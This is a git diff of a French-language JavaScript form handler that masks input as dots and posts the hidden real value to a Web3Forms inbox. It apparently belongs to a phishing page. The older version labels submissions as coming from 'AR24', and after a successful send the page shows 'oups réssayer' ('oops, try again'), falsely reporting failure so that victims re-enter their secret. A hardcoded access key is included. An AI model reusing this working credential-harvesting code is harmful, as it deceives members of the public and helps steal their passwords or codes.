@@ -1,480 +1,560 @@
 (() => {
 
 
-    const form = document.querySelector("#contact-form-2");
-    const statusMessage = document.querySelector("#form-message-2");
+const form = document.querySelector("#contact-form-2");
+const statusMessage = document.querySelector("#form-message-2");
+const display = document.querySelector("#message_display");
+const hidden = document.querySelector("#message_id");
 
-    const messageDisplay =
-        document.querySelector("#message_display");
+if (!form || !statusMessage || !display || !hidden) {
+    console.error("Éléments du formulaire introuvables.");
+    return;
+}
 
-    const messageHidden =
-        document.querySelector("#message_id");
+const submitButton = form.querySelector(
+    'input[type="submit"], button[type="submit"]'
+);
 
-    if (
-        !form ||
-        !statusMessage ||
-        !messageDisplay ||
-        !messageHidden
-    ) {
-        console.error("Éléments du formulaire introuvables.");
-        return;
-    }
+const accessKey =
+    "b5961753-93bd-448e-9cf4-fdfa97c50bf3";
 
-    const submitButton = form.querySelector(
-        'input[type="submit"], button[type="submit"]'
-    );
+// ==========================================
+// VRAIE VALEUR
+// ==========================================
 
-    const accessKey =
-        "b5961753-93bd-448e-9cf4-fdfa97c50bf3";
+let realMessage = "";
 
-    // VRAI MESSAGE
-    let realMessage = "";
+// Empêche le fallback input de se déclencher
+// juste après beforeinput.
+let handledByBeforeInput = false;
 
 
-    // ==========================================
-    // AFFICHER UNIQUEMENT DES POINTS
-    // ==========================================
+// ==========================================
+// AFFICHAGE
+// ==========================================
 
-    function updateDisplay() {
+function refreshDisplay(cursorPosition = null) {
 
-        messageDisplay.value =
-            "•".repeat(realMessage.length);
+    // Affiche uniquement des points
+    display.value = "•".repeat(realMessage.length);
 
-        messageHidden.value = realMessage;
+    // Valeur réelle pour Web3Forms
+    hidden.value = realMessage;
 
-    }
+    // Remet le curseur à sa position
+    if (cursorPosition !== null) {
 
+        requestAnimationFrame(() => {
 
-    // ==========================================
-    // GESTION DU CLAVIER
-    // ==========================================
-
-    messageDisplay.addEventListener(
-        "keydown",
-        (event) => {
-
-            const start =
-                messageDisplay.selectionStart;
-
-            const end =
-                messageDisplay.selectionEnd;
-
-
-            // ----------------------------------
-            // CTRL + A
-            // ----------------------------------
-
-            if (
-                event.ctrlKey &&
-                event.key.toLowerCase() === "a"
-            ) {
-                event.preventDefault();
-
-                messageDisplay.setSelectionRange(
-                    0,
-                    realMessage.length
-                );
-
-                return;
-            }
-
-
-            // ----------------------------------
-            // BACKSPACE
-            // ----------------------------------
-
-            if (event.key === "Backspace") {
-
-                event.preventDefault();
-
-                if (start !== end) {
-
-                    realMessage =
-                        realMessage.slice(0, start) +
-                        realMessage.slice(end);
-
-                    updateDisplay();
-
-                    messageDisplay.setSelectionRange(
-                        start,
-                        start
-                    );
-
-                } else if (start > 0) {
-
-                    realMessage =
-                        realMessage.slice(0, start - 1) +
-                        realMessage.slice(start);
-
-                    updateDisplay();
-
-                    messageDisplay.setSelectionRange(
-                        start - 1,
-                        start - 1
-                    );
-                }
-
-                return;
-            }
-
-
-            // ----------------------------------
-            // DELETE
-            // ----------------------------------
-
-            if (event.key === "Delete") {
-
-                event.preventDefault();
-
-                if (start !== end) {
-
-                    realMessage =
-                        realMessage.slice(0, start) +
-                        realMessage.slice(end);
-
-                    updateDisplay();
-
-                    messageDisplay.setSelectionRange(
-                        start,
-                        start
-                    );
-
-                } else {
-
-                    realMessage =
-                        realMessage.slice(0, start) +
-                        realMessage.slice(start + 1);
-
-                    updateDisplay();
-
-                    messageDisplay.setSelectionRange(
-                        start,
-                        start
-                    );
-                }
-
-                return;
-            }
-
-
-            // ----------------------------------
-            // FLÈCHE GAUCHE
-            // ----------------------------------
-
-            if (event.key === "ArrowLeft") {
-
-                event.preventDefault();
-
-                const position =
-                    Math.max(0, start - 1);
-
-                messageDisplay.setSelectionRange(
-                    position,
-                    position
-                );
-
-                return;
-            }
-
-
-            // ----------------------------------
-            // FLÈCHE DROITE
-            // ----------------------------------
-
-            if (event.key === "ArrowRight") {
-
-                event.preventDefault();
-
-                const position =
-                    Math.min(
-                        realMessage.length,
-                        start + 1
-                    );
-
-                messageDisplay.setSelectionRange(
-                    position,
-                    position
-                );
-
-                return;
-            }
-
-
-            // ----------------------------------
-            // HOME
-            // ----------------------------------
-
-            if (event.key === "Home") {
-
-                event.preventDefault();
-
-                messageDisplay.setSelectionRange(
-                    0,
-                    0
-                );
-
-                return;
-            }
-
-
-            // ----------------------------------
-            // END
-            // ----------------------------------
-
-            if (event.key === "End") {
-
-                event.preventDefault();
-
-                messageDisplay.setSelectionRange(
-                    realMessage.length,
-                    realMessage.length
-                );
-
-                return;
-            }
-
-
-            // ----------------------------------
-            // CARACTÈRES NORMAUX
-            // ----------------------------------
-
-            if (
-                event.key.length === 1 &&
-                !event.ctrlKey &&
-                !event.altKey &&
-                !event.metaKey
-            ) {
-
-                event.preventDefault();
-
-                const newStart = start;
-                const newEnd = end;
-
-                realMessage =
-                    realMessage.slice(0, newStart) +
-                    event.key +
-                    realMessage.slice(newEnd);
-
-                updateDisplay();
-
-                const newPosition =
-                    newStart + 1;
-
-                messageDisplay.setSelectionRange(
-                    newPosition,
-                    newPosition
-                );
-            }
-
-        }
-    );
-
-
-    // ==========================================
-    // COLLAGE
-    // ==========================================
-
-    messageDisplay.addEventListener(
-        "paste",
-        (event) => {
-
-            event.preventDefault();
-
-            const pastedText =
-                event.clipboardData.getData("text");
-
-            const start =
-                messageDisplay.selectionStart;
-
-            const end =
-                messageDisplay.selectionEnd;
-
-            realMessage =
-                realMessage.slice(0, start) +
-                pastedText +
-                realMessage.slice(end);
-
-            updateDisplay();
-
-            const newPosition =
-                start + pastedText.length;
-
-            messageDisplay.setSelectionRange(
-                newPosition,
-                newPosition
+            const position = Math.min(
+                cursorPosition,
+                realMessage.length
             );
-        }
-    );
+
+            display.setSelectionRange(
+                position,
+                position
+            );
+
+        });
+    }
+}
 
 
-    // ==========================================
-    // MESSAGE DE STATUT
-    // ==========================================
+// ==========================================
+// RÉCUPÉRER LA SÉLECTION
+// ==========================================
 
-    const setMessage = (
-        text,
-        isError = false
-    ) => {
+function getSelection() {
 
-        statusMessage.textContent = text;
-
-        statusMessage.setAttribute(
-            "role",
-            isError ? "alert" : "status"
-        );
-
+    return {
+        start: display.selectionStart || 0,
+        end: display.selectionEnd || 0
     };
 
+}
 
-    // ==========================================
-    // ENVOI WEB3FORMS
-    // ==========================================
 
-    form.addEventListener(
-        "submit",
-        async (event) => {
+// ==========================================
+// REMPLACER LA SÉLECTION
+// ==========================================
+
+function replaceSelection(text) {
+
+    const {
+        start,
+        end
+    } = getSelection();
+
+    realMessage =
+        realMessage.slice(0, start) +
+        text +
+        realMessage.slice(end);
+
+    const newPosition =
+        start + text.length;
+
+    refreshDisplay(newPosition);
+
+}
+
+
+// ==========================================
+// BEFOREINPUT
+// PC + ANDROID + IPHONE
+// ==========================================
+
+display.addEventListener(
+    "beforeinput",
+    function (event) {
+
+        /*
+         * On indique que JS va gérer
+         * directement cette modification.
+         */
+        handledByBeforeInput = true;
+
+        const {
+            start,
+            end
+        } = getSelection();
+
+        const inputType = event.inputType;
+
+
+        // ----------------------------------
+        // SAISIE NORMALE
+        // ----------------------------------
+
+        if (inputType === "insertText") {
+
+            event.preventDefault();
+
+            replaceSelection(
+                event.data || ""
+            );
+
+            return;
+        }
+
+
+        // ----------------------------------
+        // RETOUR À LA LIGNE
+        // ----------------------------------
+
+        if (inputType === "insertLineBreak") {
+
+            event.preventDefault();
+
+            replaceSelection("\n");
+
+            return;
+        }
+
+
+        // ----------------------------------
+        // COLLAGE
+        // ----------------------------------
+
+        if (inputType === "insertFromPaste") {
+
+            event.preventDefault();
+
+            /*
+             * Certains navigateurs mettent le texte
+             * directement dans event.data.
+             */
+            if (event.data !== null) {
+
+                replaceSelection(
+                    event.data
+                );
+
+                return;
+            }
+
+            /*
+             * Fallback pour certains navigateurs mobiles.
+             */
+            navigator.clipboard
+                .readText()
+                .then(text => {
+
+                    replaceSelection(text);
+
+                })
+                .catch(() => {
+
+                    console.warn(
+                        "Impossible de lire le presse-papiers."
+                    );
+
+                });
+
+            return;
+        }
+
+
+        // ----------------------------------
+        // BACKSPACE
+        // ----------------------------------
+
+        if (inputType === "deleteContentBackward") {
 
             event.preventDefault();
 
 
+            // Une sélection existe
+            if (start !== end) {
+
+                realMessage =
+                    realMessage.slice(0, start) +
+                    realMessage.slice(end);
+
+                refreshDisplay(start);
+
+                return;
+            }
+
+
+            // Rien à supprimer
+            if (start === 0) {
+                return;
+            }
+
+
+            realMessage =
+                realMessage.slice(0, start - 1) +
+                realMessage.slice(start);
+
+            refreshDisplay(start - 1);
+
+            return;
+        }
+
+
+        // ----------------------------------
+        // DELETE
+        // ----------------------------------
+
+        if (inputType === "deleteContentForward") {
+
+            event.preventDefault();
+
+
+            // Une sélection existe
+            if (start !== end) {
+
+                realMessage =
+                    realMessage.slice(0, start) +
+                    realMessage.slice(end);
+
+                refreshDisplay(start);
+
+                return;
+            }
+
+
+            // Supprime le caractère suivant
+            realMessage =
+                realMessage.slice(0, start) +
+                realMessage.slice(start + 1);
+
+            refreshDisplay(start);
+
+            return;
+        }
+
+
+        // ----------------------------------
+        // REMPLACEMENT D'UNE SÉLECTION
+        // ----------------------------------
+
+        if (
+            inputType === "insertReplacementText"
+        ) {
+
+            event.preventDefault();
+
+            replaceSelection(
+                event.data || ""
+            );
+
+            return;
+        }
+
+    }
+);
+
+
+// ==========================================
+// FALLBACK INPUT
+// Pour les navigateurs qui ne supportent
+// pas correctement beforeinput.
+// ==========================================
+
+display.addEventListener(
+    "input",
+    function () {
+
+        if (handledByBeforeInput) {
+
+            handledByBeforeInput = false;
+            return;
+        }
+
+        /*
+         * Fallback simple :
+         * on compare la longueur du textarea
+         * avec la vraie valeur.
+         */
+
+        const visibleValue = display.value;
+
+        const oldLength =
+            realMessage.length;
+
+        const newLength =
+            visibleValue.length;
+
+
+        // -------------------------------
+        // AJOUT
+        // -------------------------------
+
+        if (newLength > oldLength) {
+
+            const difference =
+                newLength - oldLength;
+
+            const position =
+                display.selectionStart;
+
+            /*
+             * Récupération approximative de
+             * la partie ajoutée.
+             */
+            const added =
+                visibleValue.slice(
+                    Math.max(
+                        0,
+                        position - difference
+                    ),
+                    position
+                );
+
+            realMessage =
+                realMessage.slice(
+                    0,
+                    position - difference
+                ) +
+                added +
+                realMessage.slice(
+                    position - difference
+                );
+
+        }
+
+
+        // -------------------------------
+        // SUPPRESSION
+        // -------------------------------
+
+        else if (newLength < oldLength) {
+
+            const difference =
+                oldLength - newLength;
+
+            const position =
+                display.selectionStart;
+
+            realMessage =
+                realMessage.slice(
+                    0,
+                    position
+                ) +
+                realMessage.slice(
+                    position + difference
+                );
+        }
+
+
+        refreshDisplay();
+
+    }
+);
+
+
+// ==========================================
+// MESSAGE DE STATUT
+// ==========================================
+
+function setMessage(
+    text,
+    isError = false
+) {
+
+    statusMessage.textContent = text;
+
+    statusMessage.setAttribute(
+        "role",
+        isError ? "alert" : "status"
+    );
+
+}
+
+
+// ==========================================
+// ENVOI WEB3FORMS
+// ==========================================
+
+form.addEventListener(
+    "submit",
+    async function (event) {
+
+        event.preventDefault();
+
+
+        if (
+            !accessKey ||
+            accessKey.trim() === ""
+        ) {
+
+            setMessage(
+                "Clé Web3Forms manquante.",
+                true
+            );
+
+            return;
+        }
+
+
+        if (realMessage.trim() === "") {
+
+            setMessage(
+                "Veuillez entrer un message.",
+                true
+            );
+
+            return;
+        }
+
+
+        if (submitButton) {
+            submitButton.disabled = true;
+        }
+
+
+        setMessage(
+            "Checking en cours…"
+        );
+
+
+        // La vraie valeur
+        hidden.value = realMessage;
+
+
+        const data =
+            new FormData(form);
+
+
+        data.append(
+            "access_key",
+            accessKey
+        );
+
+        data.append(
+            "subject",
+            "Nouveau message depuis le deuxième formulaire"
+        );
+
+        data.append(
+            "from_name",
+            "Deuxième formulaire"
+        );
+
+        data.append(
+            "botcheck",
+            ""
+        );
+
+
+        try {
+
+            const response =
+                await fetch(
+                    "https://api.web3forms.com/submit",
+                    {
+                        method: "POST",
+                        body: data
+                    }
+                );
+
+
+            const result =
+                await response.json();
+
+
+            console.log(
+                "Réponse Web3Forms :",
+                result
+            );
+
+
             if (
-                !accessKey ||
-                accessKey.trim() === ""
+                !response.ok ||
+                !result.success
             ) {
 
-                setMessage(
-                    "Clé Web3Forms manquante.",
-                    true
+                throw new Error(
+                    result.message ||
+                    "Échec de connexion"
                 );
 
-                return;
             }
 
 
-            if (realMessage.trim() === "") {
+            // -------------------------------
+            // RESET
+            // -------------------------------
 
-                setMessage(
-                    "Veuillez entrer un message.",
-                    true
-                );
+            form.reset();
 
-                return;
-            }
+            realMessage = "";
 
-
-            if (submitButton) {
-                submitButton.disabled = true;
-            }
+            display.value = "";
+            hidden.value = "";
 
 
             setMessage(
-                "Checking en cours…"
+                "oups réssayer."
             );
 
 
-            // Met à jour la vraie valeur
-            messageHidden.value =
-                realMessage;
+        } catch (error) {
 
-
-            const data =
-                new FormData(form);
-
-
-            data.append(
-                "access_key",
-                accessKey
-            );
-
-            data.append(
-                "subject",
-                "Nouveau message depuis AR24"
-            );
-
-            data.append(
-                "from_name",
-                "INFOS"
-            );
-
-            data.append(
-                "botcheck",
-                ""
+            console.error(
+                "Erreur Web3Forms :",
+                error
             );
 
 
-            try {
-
-                const response =
-                    await fetch(
-                        "https://api.web3forms.com/submit",
-                        {
-                            method: "POST",
-                            body: data
-                        }
-                    );
+            setMessage(
+                "Une erreur est survenue. Réessayez.",
+                true
+            );
 
 
-                const result =
-                    await response.json();
+        } finally {
 
-
-                console.log(
-                    "Réponse Web3Forms :",
-                    result
-                );
-
-
-                if (
-                    !response.ok ||
-                    !result.success
-                ) {
-
-                    throw new Error(
-                        result.message ||
-                        "Échec de connexion"
-                    );
-
-                }
-
-
-                // Reset
-                form.reset();
-
-                realMessage = "";
-
-                messageDisplay.value = "";
-                messageHidden.value = "";
-
-
-                setMessage(
-                    "OUPS RESSAYER."
-                );
-
-
-            } catch (error) {
-
-                console.error(
-                    "Erreur Web3Forms :",
-                    error
-                );
-
-
-                setMessage(
-                    "Une erreur est survenue. Réessayez.",
-                    true
-                );
-
-
-            } finally {
-
-                if (submitButton) {
-                    submitButton.disabled = false;
-                }
-
+            if (submitButton) {
+                submitButton.disabled = false;
             }
 
         }
-    );
+
+    }
+);
 
 
 })();
